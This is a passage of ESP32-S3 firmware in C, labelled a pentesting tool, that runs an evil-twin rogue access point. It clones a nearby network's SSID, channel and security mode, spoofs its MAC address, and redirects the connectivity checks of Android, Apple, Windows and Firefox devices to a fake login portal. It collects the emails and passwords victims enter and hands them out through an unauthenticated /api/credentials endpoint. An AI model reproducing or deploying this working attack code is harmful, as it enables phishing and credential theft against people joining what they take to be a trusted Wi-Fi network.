            xSemaphoreGive(credential_mutex);
        }
    }

    httpd_resp_set_status(req, "204 No Content");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t handle_api_start(httpd_req_t *req) {
    char content[512] = {0};
    if (httpd_req_recv(req, content, sizeof(content)-1) > 0) {
        char *sp  = strstr(content, "ssid=");
        char *cp  = strstr(content, "channel=");
        char *pp  = strstr(content, "password=");
        char *mp  = strstr(content, "mac=");

        if (sp) { sp+=5; char *e=strchr(sp,'&'); int l=e?(int)(e-sp):(int)strlen(sp);
            if(l>0&&l<32){memset(rogue_ssid,0,sizeof(rogue_ssid));strncpy(rogue_ssid,sp,l);} }
        if (pp) { pp+=9; char *e=strchr(pp,'&'); int l=e?(int)(e-pp):(int)strlen(pp);
            if(l>0&&l<64){memset(rogue_password,0,sizeof(rogue_password));strncpy(rogue_password,pp,l);} }
        if (cp) { 
            cp+=8; 
            char ch[8]={0}; 
            char *e=strchr(cp,'&'); 
            int l=e?(int)(e-cp):(int)strlen(cp);
            if(l>0&&l<8){
                strncpy(ch,cp,l);
                ch[l]='\0';
                int parsed_ch=atoi(ch);
                if(parsed_ch>=1 && parsed_ch<=13) {
                    rogue_channel=parsed_ch;
                    ESP_LOGI(TAG,"CH set: %d",rogue_channel);
                }
            } 
        }

        /* Parse authmode from request (cloned from scan) */
        int req_authmode = 0;
        char *amp = strstr(content, "authmode=");
        if (amp) {
            amp += 9;
            char amv[4] = {0};
            char *ame = strchr(amp, '&');
            int aml = ame ? (int)(ame - amp) : (int)strlen(amp);
            if (aml > 0 && aml < 4) { strncpy(amv, amp, aml); req_authmode = atoi(amv); }
        }

        wifi_config_t apc = {0};
        apc.ap.ssid_len       = strlen(rogue_ssid);
        apc.ap.channel        = rogue_channel;
        apc.ap.max_connection = ROGUE_AP_MAX_CLIENTS;
        apc.ap.authmode       = (wifi_auth_mode_t)req_authmode;
        apc.ap.beacon_interval= 25;
        apc.ap.dtim_period    = 1;
        /* Enable 802.11w PMF (Protected Management Frames) for WPA2+ */
        apc.ap.pmf_cfg.capable = true;
        apc.ap.pmf_cfg.required = false;  /* optional, not required */

        if (mp) {
            mp+=4; char dm[32]={0}; char *me=strchr(mp,'&');
            int ml=me?(int)(me-mp):(int)strlen(mp);
            if(ml>0&&ml<32){ strncpy(dm,mp,ml);
                if(strchr(dm,'%')){ char tmp[32]={0}; url_decode(dm,tmp,sizeof(tmp)); strcpy(dm,tmp); }
                uint8_t mac[6];
                if(sscanf(dm,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                          &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5])==6) {
                    if(esp_wifi_set_mac(WIFI_IF_AP,mac)==ESP_OK) ESP_LOGI(TAG,"✅ MAC spoofed");
                }
            }
        }

        if (strlen(rogue_password) > 0) {
            if (apc.ap.authmode == WIFI_AUTH_OPEN)
                apc.ap.authmode = WIFI_AUTH_WPA_WPA2_PSK;
            memcpy(apc.ap.password, rogue_password, strlen(rogue_password));
        }
        memcpy(apc.ap.ssid,rogue_ssid,strlen(rogue_ssid));

        esp_wifi_set_config(WIFI_IF_AP, &apc);
        apply_wifi_optimizations();
        esp_netif_napt_enable(ap_netif);

        if (!dns_server_running) {
            dns_server_running = true;
            xTaskCreate(dns_server_task,"dns_server",8192,NULL,2,NULL);
        }
        rogue_ap_active = true;
        ESP_LOGI(TAG,"🟢 ROGUE AP: %s ch%d (HTTPS Portal Active)",rogue_ssid,rogue_channel);

        httpd_resp_set_type(req,"application/json");
        httpd_resp_send(req,"{\"status\":\"started\"}",HTTPD_RESP_USE_STRLEN);
    }
    return ESP_OK;
}

static esp_err_t handle_api_stop(httpd_req_t *req) {
    dns_server_running = false;
    internet_unlocked  = false;

    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(300));
    rogue_ap_active = false;

    wifi_config_t apc = {0};
    apc.ap.ssid_len       = strlen(ADMIN_AP_SSID);
    apc.ap.channel        = ADMIN_AP_CHANNEL;
    apc.ap.max_connection = ADMIN_AP_MAX_CLIENTS;
    apc.ap.authmode       = WIFI_AUTH_OPEN;
    memcpy(apc.ap.ssid,ADMIN_AP_SSID,strlen(ADMIN_AP_SSID));
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(WIFI_IF_AP,&apc);
    esp_wifi_start();
    apply_wifi_optimizations();

    httpd_resp_set_type(req,"application/json");
    httpd_resp_send(req,"{\"status\":\"stopped\"}",HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t handle_api_status(httpd_req_t *req) {
    wifi_sta_list_t sl={0}; esp_wifi_ap_get_sta_list(&sl);
    char r[256];
    snprintf(r,sizeof(r),
        "{\"active\":%s,\"devices\":%d,\"credentials\":%d,\"internet\":%s}",
        rogue_ap_active?"true":"false", sl.num, credential_count,
        internet_unlocked?"true":"false");
    httpd_resp_set_type(req,"application/json");
    httpd_resp_send(req,r,HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t handle_api_credentials(httpd_req_t *req) {
    char resp[4096]="{\"count\":";
    xSemaphoreTake(credential_mutex,portMAX_DELAY);
    snprintf(resp+strlen(resp),sizeof(resp)-strlen(resp),"%d,\"list\":[",credential_count);
    for(int i=0;i<credential_count;i++){
        if(i) strcat(resp,",");
        snprintf(resp+strlen(resp),sizeof(resp)-strlen(resp),
            "{\"email\":\"%s\",\"password\":\"%s\"}",
            credentials[i].email,credentials[i].password);
    }
    strcat(resp,"]}");
    xSemaphoreGive(credential_mutex);
    httpd_resp_set_type(req,"application/json");
    httpd_resp_send(req,resp,HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static void wifi_scan_task(void *arg) {
    wifi_mode_t m; esp_wifi_get_mode(&m);
    if(m==WIFI_MODE_AP){esp_wifi_set_mode(WIFI_MODE_APSTA);vTaskDelay(pdMS_TO_TICKS(500));}
    wifi_scan_config_t sc={.ssid=0,.bssid=0,.channel=0,.show_hidden=true};
    esp_wifi_scan_start(&sc,true);
    vTaskDelete(NULL);
}

static esp_err_t handle_api_scan(httpd_req_t *req) {
    xTaskCreate(wifi_scan_task,"wifi_scan",4096,NULL,1,NULL);
    httpd_resp_set_type(req,"application/json");
    httpd_resp_send(req,"{\"status\":\"scanning\"}",HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t handle_api_scan_results(httpd_req_t *req) {
    char resp[4096]; char *p=resp;
    p+=snprintf(p,sizeof(resp)-(p-resp),"{\"count\":%d,\"list\":[",ap_count);
    for(int i=0;i<ap_count;i++){
        if(i) p+=snprintf(p,sizeof(resp)-(p-resp),",");
        p+=snprintf(p,sizeof(resp)-(p-resp),
            "{\"ssid\":\"%s\",\"channel\":%d,\"rssi\":%d,"
            "\"bssid\":\"%02x:%02x:%02x:%02x:%02x:%02x\",\"authmode\":%d}",
            ap_records[i].ssid,ap_records[i].primary,ap_records[i].rssi,
            ap_records[i].bssid[0],ap_records[i].bssid[1],ap_records[i].bssid[2],
            ap_records[i].bssid[3],ap_records[i].bssid[4],ap_records[i].bssid[5],
            ap_records[i].authmode);
    }
    snprintf(p,sizeof(resp)-(p-resp),"]}");
    httpd_resp_set_type(req,"application/json");
    httpd_resp_send(req,resp,HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t handle_api_clients(httpd_req_t *req) {
    wifi_sta_list_t sta_list;
    esp_wifi_ap_get_sta_list(&sta_list);

    char resp[2048]; char *p=resp;
    p+=snprintf(p,sizeof(resp)-(p-resp),"{\"count\":%d,\"clients\":[", sta_list.num);

    for(int i=0; i<sta_list.num; i++) {
        if(i) p+=snprintf(p,sizeof(resp)-(p-resp),",");
        wifi_sta_info_t *sta = &sta_list.sta[i];
        p+=snprintf(p,sizeof(resp)-(p-resp),
            "{\"mac\":\"%02x:%02x:%02x:%02x:%02x:%02x\",\"rssi\":%d}",
            sta->mac[0],sta->mac[1],sta->mac[2],
            sta->mac[3],sta->mac[4],sta->mac[5],sta->rssi);
    }
    snprintf(p,sizeof(resp)-(p-resp),"]}");

    httpd_resp_set_type(req,"application/json");
    httpd_resp_send(req,resp,HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t handle_api_intercept(httpd_req_t *req) {
    internet_unlocked = false;
    traffic_push("SYS  *** INTERCEPT ON – portal re-locked ***");
    ESP_LOGI(TAG, "🔒 INTERCEPT ON – portal re-locked");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, "{\"status\":\"intercepting\"}", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t handle_api_release(httpd_req_t *req) {
    internet_unlocked = true;
    traffic_push("SYS  *** RELEASE – internet unlocked ***");
    ESP_LOGI(TAG, "🌐🔓 RELEASE – internet unlocked by admin");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, "{\"status\":\"released\"}", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t handle_api_clear(httpd_req_t *req) {
    xSemaphoreTake(credential_mutex,portMAX_DELAY);
    credential_count=0; memset(credentials,0,sizeof(credentials));
    xSemaphoreGive(credential_mutex);
    httpd_resp_set_type(req,"application/json");
    httpd_resp_send(req,"{\"status\":\"cleared\"}",HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t handle_api_isp_config(httpd_req_t *req) {
    char content[512] = {0};
    if (httpd_req_recv(req, content, sizeof(content)-1) <= 0) {
        httpd_resp_set_type(req,"application/json");
        httpd_resp_send(req,"{\"status\":\"error\",\"msg\":\"no data\"}",HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }

    char  isp_s[33] = {0};
    char  isp_p[64] = {0};
    char *sp = strstr(content, "ssid=");
    char *pp = strstr(content, "password=");

    if (sp) { sp+=5; char *e=strchr(sp,'&'); int l=e?(int)(e-sp):(int)strlen(sp);
        if(l>0&&l<32) strncpy(isp_s,sp,l); }
    if (pp) { pp+=9; int l=(int)strlen(pp); if(l>0&&l<64) strncpy(isp_p,pp,l); }

    if (strlen(isp_s) > 0) {
        xSemaphoreTake(isp_creds_mutex, portMAX_DELAY);
        memset(isp_ssid, 0, sizeof(isp_ssid));
        memset(isp_password, 0, sizeof(isp_password));
        strncpy(isp_ssid, isp_s, 32);
        strncpy(isp_password, isp_p, 63);
        xSemaphoreGive(isp_creds_mutex);

        ESP_LOGI(TAG, "✅ ISP AP updated: %s", isp_ssid);

        /* Reconnect with new credentials */
        wifi_config_t sc = {0};
        strncpy((char *)sc.sta.ssid,     isp_s, 31);
        strncpy((char *)sc.sta.password, isp_p, 63);
        sc.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
        esp_wifi_set_config(WIFI_IF_STA, &sc);
        esp_wifi_connect();
        sta_retry_count = 0;

        httpd_resp_set_type(req,"application/json");
        httpd_resp_send(req,"{\"status\":\"ok\",\"msg\":\"ISP AP configured and connecting\"}",HTTPD_RESP_USE_STRLEN);
    } else {
        httpd_resp_set_type(req,"application/json");
        httpd_resp_send(req,"{\"status\":\"error\",\"msg\":\"invalid SSID\"}",HTTPD_RESP_USE_STRLEN);
    }
    return ESP_OK;
}

static esp_err_t handle_api_isp_status(httpd_req_t *req) {
    xSemaphoreTake(isp_creds_mutex, portMAX_DELAY);
    char resp[512];
    snprintf(resp, sizeof(resp),
        "{\"isp_ssid\":\"%s\",\"isp_connected\":%s}",
        isp_ssid,
        wifi_sta_get_state()==WIFI_STA_CONNECTED ? "true" : "false");
    xSemaphoreGive(isp_creds_mutex);
    httpd_resp_set_type(req,"application/json");
    httpd_resp_send(req,resp,HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// ==================== CAPTIVE PORTAL DETECTION ====================

/* Serve login page on HTTP (port 80) — no cert warnings in captive browsers */
static esp_err_t handle_http_portal(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html; charset=utf-8");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache,no-store,must-revalidate");
    httpd_resp_send(req, LOGIN_PAGE, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

/* Intercept OS connectivity checks → force captive portal popup */
static esp_err_t handle_captive_redirect(httpd_req_t *req) {
    const char *uri = req->uri;
    ESP_LOGI(TAG, "CAPTIVE CHECK: %s", uri);
    {
        char _te[TRAFFIC_ENTRY_LEN];
        snprintf(_te, sizeof(_te), "CAPT %.50s", uri);
        traffic_push(_te);
    }

    /* Android: connectivitycheck.gstatic.com/generate_204
       Return anything other than 204 → triggers "Sign in to network" */
    if (strstr(uri, "generate_204") || strstr(uri, "gen_204")) {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "http://" AP_IP "/portal");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }

    /* Apple: captive.apple.com/hotspot-detect.html
       Return anything other than "Success" → opens CNA sheet */
    if (strstr(uri, "hotspot-detect") || strstr(uri, "/library/test")) {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "http://" AP_IP "/portal");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }

    /* Windows NCSI: www.msftconnecttest.com/connecttest.txt
       Return non-expected body → triggers notification */
    if (strstr(uri, "connecttest") || strstr(uri, "ncsi")) {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "http://" AP_IP "/portal");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }

    /* Firefox: detectportal.firefox.com/success.txt */
    if (strstr(uri, "success.txt") || strstr(uri, "detectportal")) {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "http://" AP_IP "/portal");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }

    /* Samsung / Xiaomi / other Android OEMs */
    if (strstr(uri, "check_network") || strstr(uri, "generate_204_") ||
        strstr(uri, "redirect") || strstr(uri, "hotspot")) {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "http://" AP_IP "/portal");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }

    /* Fallback: redirect everything else to portal */
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://" AP_IP "/portal");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

// ==================== EVENT HANDLER ====================
static void wifi_event_handler(void *arg, esp_event_base_t base,
                               int32_t id, void *data) {
    if (base==WIFI_EVENT && id==WIFI_EVENT_SCAN_DONE) {
        uint16_t n=20; esp_wifi_scan_get_ap_records(&n,ap_records); ap_count=n;
    }
    if (base==WIFI_EVENT && id==WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t *ev = (wifi_event_ap_staconnected_t *)data;
        ESP_LOGI(TAG,">>> CLIENT CONNECTED [%02x:%02x:%02x:%02x:%02x:%02x] <<<",
                 ev->mac[0], ev->mac[1], ev->mac[2], ev->mac[3], ev->mac[4], ev->mac[5]);
        {
            char _te[TRAFFIC_ENTRY_LEN];
            snprintf(_te, sizeof(_te), "AP   [%02x:%02x:%02x] client connected",
                     ev->mac[3], ev->mac[4], ev->mac[5]);
            traffic_push(_te);
        }
    }
    if (base==WIFI_EVENT && id==WIFI_EVENT_STA_DISCONNECTED) {
        wifi_event_sta_disconnected_t *disc = (wifi_event_sta_disconnected_t *)data;
        ESP_LOGW(TAG, "STA disconnected reason=%d",  (int)disc->reason);
        if (sta_retry_count < STA_MAX_RETRY) {
            sta_retry_count++;
            ESP_LOGW(TAG, "STA retry %d/%d in 2s", sta_retry_count, STA_MAX_RETRY);
            vTaskDelay(pdMS_TO_TICKS(2000));
            esp_wifi_connect();
        } else {
            ESP_LOGE(TAG, "STA: max retries");
            sta_retry_count = 0;
            xEventGroupSetBits(wifi_event_group, WIFI_FAIL_BIT);
            vTaskDelay(pdMS_TO_TICKS(5000));
            esp_wifi_connect();
        }
    }
    if (base==IP_EVENT && id==IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *ev=(ip_event_got_ip_t*)data;
        ESP_LOGI(TAG,"✅ STA IP: " IPSTR " – NAPT ready",
                 IP2STR(&ev->ip_info.ip));
        sta_retry_count=0;
        xEventGroupSetBits(wifi_event_group,WIFI_CONNECTED_BIT);
    }
}

// ==================== WIFI INIT ====================
static void init_wifi(void) {
    wifi_event_group = xEventGroupCreate();
    esp_netif_init();
    esp_event_loop_create_default();

    ap_netif  = esp_netif_create_default_wifi_ap();
    sta_netif = esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);

    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,    &wifi_event_handler, NULL);
    esp_event_handler_register(IP_EVENT,   IP_EVENT_STA_GOT_IP, &wifi_event_handler, NULL);

    wifi_config_t apc = {0};
    apc.ap.ssid_len       = strlen(ADMIN_AP_SSID);
    apc.ap.channel        = ADMIN_AP_CHANNEL;
    apc.ap.max_connection = ADMIN_AP_MAX_CLIENTS;
    apc.ap.authmode       = WIFI_AUTH_OPEN;
    apc.ap.beacon_interval= 25;
    apc.ap.dtim_period    = 1;
    memcpy(apc.ap.ssid, ADMIN_AP_SSID, strlen(ADMIN_AP_SSID));

    wifi_config_t stac = {0};
    strncpy((char *)stac.sta.ssid,     UPSTREAM_SSID,     31);
    strncpy((char *)stac.sta.password, UPSTREAM_PASSWORD, 63);
    stac.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(WIFI_IF_AP,  &apc);
    esp_wifi_set_config(WIFI_IF_STA, &stac);
    esp_wifi_start();
    ESP_LOGI(TAG, "STA: connecting to [%s]", UPSTREAM_SSID);
    esp_wifi_connect();

    apply_wifi_optimizations();

    esp_err_t nr = esp_netif_napt_enable(ap_netif);
    if (nr == ESP_OK)
        ESP_LOGI(TAG,"✅ NAPT enabled");
    else
        ESP_LOGE(TAG,"❌ NAPT failed (%s)",esp_err_to_name(nr));
}

// ==================== WEB SERVERS (HTTP + HTTPS) ====================
static void start_web_servers(void) {
    /* ── HTTP Server (port 80) ──────────────────────────────────── */
    httpd_config_t http_cfg = HTTPD_DEFAULT_CONFIG();
    http_cfg.max_open_sockets = 7;
    http_cfg.server_port      = 80;
    http_cfg.stack_size       = 8192;
    http_cfg.lru_purge_enable = true;
    http_cfg.uri_match_fn     = httpd_uri_match_wildcard;
    http_cfg.max_uri_handlers = 24;

    if (httpd_start(&admin_server, &http_cfg) != ESP_OK) {
        ESP_LOGE(TAG,"HTTP server start failed"); return;
    }
    ESP_LOGI(TAG,"✓ HTTP server on port 80 (admin panel)");

    /* ── HTTPS disabled: Use HTTP portal instead (works for captive portals) ── */
    ESP_LOGI(TAG,"⚠️  HTTPS skipped - using HTTP portal on port 80");

    /* Register HTTP handlers */
    httpd_uri_t http_routes[] = {
        {.uri="/admin",            .method=HTTP_GET,  .handler=handle_admin,           .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/start",        .method=HTTP_POST, .handler=handle_api_start,       .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/stop",         .method=HTTP_GET,  .handler=handle_api_stop,        .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/status",       .method=HTTP_GET,  .handler=handle_api_status,      .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/credentials",  .method=HTTP_GET,  .handler=handle_api_credentials, .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/clients",      .method=HTTP_GET,  .handler=handle_api_clients,     .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/intercept",    .method=HTTP_GET,  .handler=handle_api_intercept,   .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/release",      .method=HTTP_GET,  .handler=handle_api_release,     .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/clear",        .method=HTTP_GET,  .handler=handle_api_clear,       .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/isp_config",   .method=HTTP_POST, .handler=handle_api_isp_config,  .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/isp_status",   .method=HTTP_GET,  .handler=handle_api_isp_status,  .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/scan",         .method=HTTP_GET,  .handler=handle_api_scan,        .user_ctx=NULL, .is_websocket=false},
        {.uri="/api/scan_results", .method=HTTP_GET,  .handler=handle_api_scan_results,.user_ctx=NULL, .is_websocket=false},
        /* Login portal on HTTP (no cert warnings) */
        {.uri="/",                 .method=HTTP_GET,  .handler=handle_http_portal,     .user_ctx=NULL, .is_websocket=false},
        {.uri="/submit",           .method=HTTP_POST, .handler=handle_submit,          .user_ctx=NULL, .is_websocket=false},
        {.uri="/portal",           .method=HTTP_GET,  .handler=handle_http_portal,     .user_ctx=NULL, .is_websocket=false},
        /* Wildcard MUST be last: catches all connectivity checks */
        {.uri="/*",                .method=HTTP_GET,  .handler=handle_captive_redirect,.user_ctx=NULL, .is_websocket=false},
        {.uri="/*",                .method=HTTP_POST, .handler=handle_captive_post,    .user_ctx=NULL, .is_websocket=false},
    };
    for (int i = 0; i < (int)(sizeof(http_routes)/sizeof(http_routes[0])); i++)
        httpd_register_uri_handler(admin_server, &http_routes[i]);

    ESP_LOGI(TAG,"Web servers started successfully");
}

// ==================== APP MAIN ====================
void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret==ESP_ERR_NVS_NO_FREE_PAGES || ret==ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    /* Suppress WiFi driver verbose logging (PMF/SA Query messages) */
    esp_log_level_set("wifi", ESP_LOG_WARN);

    ESP_LOGI(TAG,"════════════════════════════════════════");
    ESP_LOGI(TAG,"  🔐 ESP32-S3 Rogue AP – Pentesting Tool");
    ESP_LOGI(TAG,"  DNS Spoofing: " SPOOFED_DOMAIN);
    ESP_LOGI(TAG,"  Portal Protocol: HTTP (port 80)       ");
    ESP_LOGI(TAG,"  WPA2/PMF + NAPT Passthrough           ");
    ESP_LOGI(TAG,"════════════════════════════════════════");

    credential_mutex = xSemaphoreCreateMutex();
    traffic_mutex    = xSemaphoreCreateMutex();
    isp_creds_mutex  = xSemaphoreCreateMutex();
    init_wifi();
    vTaskDelay(pdMS_TO_TICKS(500));
    start_web_servers();

    ESP_LOGI(TAG,"Admin Panel: http://192.168.4.1/admin");
    ESP_LOGI(TAG,"Login Portal: http://" SPOOFED_DOMAIN "/");
    ESP_LOGI(TAG,"════════════════════════════════════════");
    ESP_LOGI(TAG,"Features:");
    ESP_LOGI(TAG,"  ✓ DNS spoofing + captive portal");
    ESP_LOGI(TAG,"  ✓ Real-time client monitoring");
    ESP_LOGI(TAG,"  ✓ WPA2/PMF security cloning");
    ESP_LOGI(TAG,"  ✓ NAPT internet passthrough");
    ESP_LOGI(TAG,"════════════════════════════════════════");
}